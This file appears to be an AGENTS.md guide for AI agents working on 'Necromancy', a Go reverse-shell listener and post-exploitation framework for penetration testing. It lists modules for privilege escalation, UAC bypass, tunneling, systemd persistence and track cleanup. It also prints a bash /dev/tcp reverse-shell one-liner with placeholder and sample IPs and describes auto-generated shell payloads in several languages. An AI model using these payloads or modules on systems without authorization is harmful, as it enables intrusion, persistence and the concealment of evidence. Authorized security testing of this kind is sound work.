# 🤖 AGENTS.md - AI Agent Documentation for Necromancy

## 📋 Overview

This document provides comprehensive information for AI agents working with the Necromancy codebase. It contains technical details, architecture information, and development guidelines to ensure effective assistance.

## 🏗️ Project Architecture

### Core Components

```
necromancy/
├── core/           # Core functionality (sessions, networking)
├── modules/        # Post-exploitation modules
├── ui/            # Terminal user interface (tview-based)
├── utils/         # Utility functions (formatting, colors)
├── server/        # HTTP file server
├── pty/           # PTY upgrade functionality
├── ascii.txt      # Custom ASCII banner (BBCode format)
└── main.go        # Application entry point
```

### Key Dependencies
- **tview**: Terminal UI framework
- **golang.org/x/term**: Terminal utilities
- **tcell**: Terminal control library

## 🎯 Core Functionality

### Session Management (`core/`)
- **Session**: Represents individual reverse shell connections
- **SessionManager**: Manages multiple sessions concurrently
- **SessionType**: Enum for session types (PTY, Basic, Bind)

### Module System (`modules/`)
- **Module Interface**: Standard interface for all post-exploitation modules
- **ModuleManager**: Registry and execution manager for modules
- **Built-in Modules**: 13+ modules including PEASS, tunneling, escalation

### Available Modules

| Module | Description | Platform | Category |
|--------|-------------|----------|----------|
| **PEASS** | Privilege escalation awesome scripts suite | Linux/Windows | 🎯 Enumeration |
| **Linux Exploit Suggester** | Automated exploit recommendations | Linux | ⚡ Exploitation |
| **LSE** | Linux smart enumeration tool | Linux | 🎯 Enumeration |
| **Potato Exploits** | Windows privilege escalation methods | Windows | 🔑 Privilege Escalation |
| **Chisel** | Fast TCP/UDP tunnel over HTTP | Multi | 🚇 Tunneling |
| **Ligolo** | Reverse proxy for penetration testing | Multi | 🚇 Tunneling |
| **Ngrok** | Secure tunnel to localhost | Multi | 🚇 Tunneling |
| **Meterpreter** | Upgrade to Metasploit sessions | Multi | 🚀 Session Upgrade |
| **Cleanup** | Remove tracks and artifacts | Multi | 🧹 Cleanup |
| **Traitor** | Automated Linux privilege escalation | Linux | 🔑 Privilege Escalation |
| **UAC Bypass** | Windows UAC bypass techniques | Windows | 🔑 Privilege Escalation |
| **Panix** | Linux persistence via systemd | Linux | 🕰️ Persistence |
| **Memory Dump** | Process memory analysis | Linux | 🧠 Forensics |

### UI System (`ui/`)
- **App**: Main application controller
- **Menu System**: Interactive menu with keyboard shortcuts
- **Session Browser**: Visual session management
- **Module Browser**: Module discovery and execution

## 🎨 ASCII Banner System

### BBCode Color Support
```bbcode
[color=#FF0000]Red Text[/color]
[color=#00FF00]Green Text[/color]
[color=#0000FF]Blue Text[/color]
```

### Color Conversion
- BBCode colors → ANSI escape codes
- Hex colors → Terminal 256-color palette
- Fallback to basic colors for compatibility

## 🌍 Multi-Platform Support

### Platform Matrix
- **Linux**: amd64, arm64
- **macOS**: amd64 (Intel), arm64 (Apple Silicon)
- **Windows**: amd64

## 🚀 Command Line Interface

### Installation via Go
```bash
# Install latest version
go install github.com/Aryma-f4/necromancy@latest

# Install specific version
go install github.com/Aryma-f4/necromancy@v1.2.0

# Build with version info
go build -ldflags="-s -w -X main.Version=v1.2.0 -X main.BuildDate=$(date -u +%Y-%m-%d)" -o necromancy .
```

### Basic Usage
```bash
./necromancy -p 4444                    # Single port
./necromancy -p 4444,4445,4446        # Multiple ports
./necromancy -c target.com -p 4444    # Connect to bind shell
./necromancy -s /path/to/files -w 8000   # HTTP file server
```

## 📊 Use Cases

### Basic Reverse Shell Workflow
```mermaid
graph TD
    subgraph "Penetration Tester"
        A[👤 Attacker] -->|"Uses"| B[🧙‍♂️ Necromancy]
    end
    
    subgraph "Target System"
        C[🖥️ Target] -->|"Connects to"| D[🌐 Listener]
        E[💻 Shell] -->|"Provides"| F[🔓 Access]
    end
    
    B -->|"Configures"| G[⚙️ Listener Setup]
    G -->|"Generates"| H[📄 Payloads]
    H -->|"Executed on"| C
    C -->|"Establishes"| I[🔗 Reverse Connection]
    I -->|"Creates"| J[🎯 Interactive Session]
    J -->|"Enables"| K[🛠️ Post-Exploitation]
    K -->|"Includes"| L[📁 File Operations]
    K -->|"Includes"| M[🔍 Module Execution]
    
    style A fill:#4CAF50,stroke:#2E7D32,color:#fff
    style B fill:#9C27B0,stroke:#6A1B9A,color:#fff
    style C fill:#FF5722,stroke:#D84315,color:#fff
    style J fill:#2196F3,stroke:#1565C0,color:#fff
    style K fill:#FFC107,stroke:#F57C00,color:#000
```

### File Manager Operations
```mermaid
graph TD
    subgraph "User Interface"
        A[👤 User] -->|"Opens"| B[📁 File Manager]
    end
    
    subgraph "Navigation Operations"
        B -->|"Browse"| C[📂 Directory Navigation]
        B -->|"View"| D[📋 File Listing]
    end
    
    subgraph "File Operations"
        D -->|"Select"| E[📄 File Selection]
        E -->|"Actions"| F[⚙️ File Actions]
        
        F -->|"Download"| G[⬇️ Download File]
        F -->|"Upload"| H[⬆️ Upload File]
        F -->|"Delete"| I[🗑️ Delete File]
        F -->|"Execute"| J[▶️ Execute File]
        F -->|"Edit"| K[✏️ Edit File]
        F -->|"Copy"| L[📋 Copy File]
    end
    
    subgraph "System Operations"
        M[🆕 Create New] --> B
        N[📊 Properties] --> E
        O[🔍 Search] --> D
    end
    
    style A fill:#4CAF50,stroke:#2E7D32,color:#fff
    style B fill:#2196F3,stroke:#1565C0,color:#fff
    style F fill:#FF9800,stroke:#F57C00,color:#000
    style G fill:#8BC34A,stroke:#558B2F,color:#fff
    style H fill:#8BC34A,stroke:#558B2F,color:#fff
    style I fill:#F44336,stroke:#C62828,color:#fff
    style J fill:#9C27B0,stroke:#6A1B9A,color:#fff
```

### Network Information Flow & Payload Updates
```mermaid
graph TD
    subgraph "Network Detection Process"
        A[🌐 Network Info System] -->|"Detects"| B[🏠 Local IP Detection]
        B -->|"Queries"| C[🌍 Public IP Services]
        C -->|"Retrieves"| D[📍 Location Data]
        D -->|"Provides"| E[🎯 IP Information]
    end
    
    subgraph "External Services"
        F[☁️ IPify API] --> C
        G[☁️ AWS CheckIP] --> C
        H[☁️ IfConfig.me] --> C
        I[☁️ ICanHazIP] --> C
    end
    
    subgraph "Information Display"
        J[📊 Network Interfaces] --> A
        K[🗺️ Geographic Location] --> D
        L[🏢 ISP Information] --> D
    end
    
    subgraph "Payload Generation Process"
        E -->|"Updates"| M[📝 Payload Templates]
        M -->|"Replaces YOUR_IP with"| N[🎯 Actual IP Address]
        N -->|"Generates"| O[📄 Updated Payloads]
        
        M --> P[⚙️ Bash Payload]
        M --> Q[� Python Payload]
        M --> R[🕸️ Netcat Payload]
        M --> S[💎 PowerShell Payload]
    end
    
    subgraph "Payload Types (Auto-Updated)"
        O --> T[🔗 Reverse Shell Commands]
        T --> U[🖥️ Linux/Unix Payloads]
        T --> V[🪟 Windows Payloads]
        T --> W[🐧 Cross-Platform Payloads]
    end
    
    style A fill:#2196F3,stroke:#1565C0,color:#fff
    style B fill:#4CAF50,stroke:#2E7D32,color:#fff
    style C fill:#FF9800,stroke:#F57C00,color:#000
    style D fill:#9C27B0,stroke:#6A1B9A,color:#fff
    style E fill:#00BCD4,stroke:#00838F,color:#fff
    style M fill:#795548,stroke:#4E342E,color:#fff
    style N fill:#607D8B,stroke:#37474F,color:#fff
    style O fill:#E91E63,stroke:#C2185B,color:#fff
```

### Payload Updates Feature Explanation

The **Payload Updates** feature automatically updates generated payloads with real network information:

1. **IP Detection**: Automatically detects local and public IP addresses
2. **Port Configuration**: Uses configured listening ports instead of defaults
3. **Template Replacement**: Replaces `YOUR_IP` with actual IP addresses
4. **Multi-IP Support**: Prefers public IP when available, falls back to local IP
5. **Real-time Updates**: Payloads refresh when network information changes

#### Example Update Process:
```bash
# Before update (Template):
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# After update (with public IP):
bash -i >& /dev/tcp/203.0.113.45/4444 0>&1

# After update (with local IP only):
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
```

#### Supported Payload Types (Auto-Updated):
- **🐚 Bash**: Traditional bash reverse shell
- **🐍 Python**: Python with PTY support for full TTY
- **🕸️ Netcat**: FIFO-based netcat reverse shell
- **💎 PowerShell**: Windows PowerShell reverse shell
- **🐘 PHP**: PHP reverse shell for web servers
- **💎 Ruby**: Ruby reverse shell
- **🐪 Perl**: Perl reverse shell
```

## 🐛 Common Issues & Solutions

### Build Issues
- **Windows SIGWINCH**: Use build constraints
- **Missing dependencies**: Check go.mod
- **Cross-compilation**: Use proper GOOS/GOARCH

### Runtime Issues
- **Banner not displaying**: Check ascii.txt permissions
- **Sessions not connecting**: Verify network configuration
- **Modules not loading**: Check module registration

## 📝 Code Style Guidelines

### Go Conventions
- Follow standard Go formatting
- Use meaningful variable names
- Handle errors properly

### Module Development
- Use descriptive names
- Provide clear descriptions
- Include error handling
- Test thoroughly

## 🔄 Version Control

### Current Version
- **Version**: 1.2.0
- **Repository**: https://github.com/Aryma-f4/necromancy
- **License**: MIT

---

**Last Updated**: 2026-04-23  
**Version**: 1.2.0  
**Repository**: https://github.com/Aryma-f4/necromancy